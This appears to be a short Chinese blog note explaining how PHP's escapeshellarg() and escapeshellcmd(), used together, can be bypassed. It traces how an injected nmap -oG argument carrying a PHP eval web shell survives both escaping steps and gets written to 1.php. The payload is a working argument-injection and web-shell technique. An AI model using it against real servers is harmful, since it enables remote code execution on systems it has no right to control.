PHP escapeshellarg()+escapeshellcmd() 之殇

2022-11-26


escapeshellarg()：
先将字符串用单引号括起来，然后再对单引号进行转义，转义完后会将转义后的单引号两侧再加个单引号。
1.' <?php eval($_POST[1]);?> -oG 1.php ' 字符串
2.'' <?php eval($_POST[1]);?> -oG 1.php '' 两侧加上单引号，用单引号将字符串括起来。
3.'\' <?php eval($_POST[1]);?> -oG 1.php \'' 对单引号括起来的字符串中的单引号进行转义。
4.''\'' <?php eval($_POST[1]);?> -oG 1.php '\''' 在转义后的 \' 两侧各加上一个 ' ,'\''

escapeshellcmd()：
对一些特殊字符和未配对的单引号进行转义。
处理后为:
''\\'' \<\?php eval($_POST[1])\;\?\> -oG 1.php '\\'''
等价于：
\ \<\?php eval($_POST[1])\;\?\> -oG 1.php \

其他：
-iL 读取文件内容，以文件内容作为搜索目标
-o 输出到文件
举例

nmap -iL ip_target.txt -o result.txt
